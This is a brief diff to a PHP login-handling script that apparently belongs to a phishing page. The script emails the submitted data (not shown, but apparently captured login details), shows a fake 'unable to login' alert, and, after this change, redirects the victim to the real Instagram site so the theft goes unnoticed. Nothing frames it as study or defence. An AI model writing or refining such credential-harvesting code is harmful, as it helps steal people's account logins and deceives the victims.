@@ -19,8 +19,9 @@ echo"<script type='text/javascript'>alert('Please enter correct username or pass
 else 
 { 
     mail($to,$subject,$txt); // send an email 
-    echo"<script type='text/javascript'>alert('Sorry ! unable to open ');
-    window.history.go(-1);
+    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
+     // Simulate an HTTP redirect:
+    window.location.replace('http://www.instagram.com');
     </script>";
 }
 
